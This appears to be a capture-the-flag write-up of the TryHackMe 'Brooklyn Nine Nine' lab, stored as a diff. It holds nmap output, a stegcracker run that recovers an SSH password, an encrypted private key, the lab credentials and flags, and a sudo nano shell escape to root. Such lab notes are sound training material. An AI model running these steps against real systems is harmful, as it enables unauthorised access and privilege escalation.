@@ -1,0 +1,148 @@
+THM - brooklyn nine nine - 18 Oct 2022
+
+10.10.163.20
+
+---------------------
+users
+Amy
+Jake
+Holt
+
+
+creds:
+holt:fluffydog12@ninenine
+
+flags:
+
+ee11cbb19052e40b07aac0ca060c23ee	user.txt
+63a9f0ea7bb98050796b649e85481845	root.txt
+--------------------------------------
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.66.85
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 02:8B:7D:DD:67:0D (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+21 ftp --> anonymous login
+
+note_to_jake.txt
+From Amy,
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+80 http --> fuzzing dir/files; nikto, manual enumeration, check the source
+**no results from fuzzing
+**source code indicated steganograpy
+root@ip-10-10-66-85:~# stegcracker brooklyn99.jpg Tools/wordlists/rockyou.txt 
+StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2022 - Luke Paris (Paradoxis)
+
+Counting lines in wordlist..
+Attacking file 'brooklyn99.jpg' with wordlist 'Tools/wordlists/rockyou.txt'..
+Successfully cracked file with password: admin
+Tried 20650 passwords
+Your file has been written to: brooklyn99.jpg.out
+admin
+
+root@ip-10-10-66-85:~# cat brooklyn99.jpg.out 
+Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!
+
+
+----- succuessfull ssh login with holt:fluffydog12@ninenine
+holt@brookly_nine_nine:~$ whoami
+holt
+holt@brookly_nine_nine:~$ id
+uid=1002(holt) gid=1002(holt) groups=1002(holt)
+holt@brookly_nine_nine:~$ cat user.txt
+ee11cbb19052e40b07aac0ca060c23ee
+
+
+Holt's .ssh key
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7FEB01DFD04064BFFC03CBB293CEF0F9
+
+8rta3aQd8iUsjaUJ7S+j4wUbMhIGhWaSFOwuyDvKOfTEuFpNSv5DkA/p6D7qcBIE
++YGVvFBPN3fOdnD0kyChCjRIsgtNsy2y/u2/ts7V8tsz/FqYHdpRDvn0btQc1WhV
+K+T7Mgg1ou2Lk/I+u8VTFk7mtUbgrB1t8IIqX5fC5ISopggr/KK/0Lk5uGkpUnRr
+gA+yiPx+6f5LNT3OwMeCfOI7zS+fqXsmM89mzsKcs6hmwlvGyg6UtwEO250vZJmE
+ulDYrM9Y3hXAKxBXhKjAXUp3I07YRzvsupuiYqqgxTqcIRUlayq4CGnefqtmGnTd
+kSrnnvsfEwGJwDVajVrFEdwIXh/5FKPxQSOYktrTzWnijzzJk8qBBxxtpCSzz0Zk
+7/g/eDUWg6RpMDukWToQWlCS9lWQnOBBn2FHAHVmdnaHs9mjfDwtXg9Tvd5m9Nkk
+Y06i/mjsrDV0v2PtlA9DnuSd8idaRQmcmXTbAJTVFUbpIGWuStFHI9SIq9IF2Wh1
+h7iZZzSEWHuoBp70Ruoizu+/GuNnPs3nMFp/4x0dXztiwHPZ5K5g7fAjg0VZbPEB
+dC+LxJ9LtULcWMe2AcD0aYPMckiSf+3emFAQCxGtqESuMZiUgd6D2dgDIu0Xi1OM
+3sVX2gE4iDEonkilX+GLLUrwg82uhlGNyXuWtFl9Fhp3CiNyxi+zN54PrIeU6ADE
+iBVyjazw10EGFuYO9x2/jkJ1LBnM/C7x582ZBSHgJBDLA287kPo8beaS31C6V7fH
+pQJWHSN5Oo92e3whynqWSle/A045FRQsxxxQLDr1nM1wJlfXGpuqgs+mE4fF3UKk
+rBM6ErFUVYUwcXIZ+NSkCV80teUimpIP0ul3tgXsag2lOgK20/K3nDJBQeg/7iGs
+0PIjw6+o8BGJfeq5peGa5F6kuvnEGIAJsbChl4BAdEggO+aem1l7p33+zUUUOa49
+HYrpmze3DkhE32ClE5oQB1D9hSdQKTz5RSBUw8EZhRHzvs7EuRd/q8xe+YWsmkB0
+iK1T0hLcyOUnRy0xsXtbv65Ba1BPYyfvOHHZGTt0yHajp4hHsFb6FQrSylTOpTR7
+yc34xdZH39H3wEiVymnJ4kVvJez6xKXGueY5ZQXXJnWPnddvFF+4u2/R2LQlt3BL
+ODWUfNZP+9KDt6OexU8ZrT7SszYu8CoH0MoFtttaDNCZkuB0JxBQaQKiUXnRt3xv
+S2blkjzd9dOo2Ebl0sebmcquySg9cgb31WnPSbVkzaBAm+V9geJUz0mwO0QpJD4g
+8jiW6ph0l8Yv6iq2aeOWAm2zDOhJjOwAZpPefu4kBa9X7P5j6ekTHSOdwPAfMG8s
+rEKDQsj5rvm/qpWAJwCgTuoPXGqMSNHwVBL4+Fmzc/cl5/PHdr3LS8CL2CJc+BrO
++le8hcPQQWmR4n1Lss6zUVB8ElzGnfGvqgnZ0DwJlsj+NHF+pK8sx2dz8Ywa5WXx
+eApPx3ASu2agU8IRvq0Z6IuWw1rvprmiXyBWCQ9NBOjIo4dnL6cLE+UmVmQThxst
+hnxQNnTVZlFLdM5mJjNyzCyfsdvyu5QxsDfEtTCLBH3P8ittfeSWv1WlF0b6nkUO
+-----END RSA PRIVATE KEY-----
+
+holt@brookly_nine_nine:/$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+
+https://gtfobins.github.io/gtfobins/nano/#sudo
+
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+
+root@brookly_nine_nine:/root# cat root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+
+
+
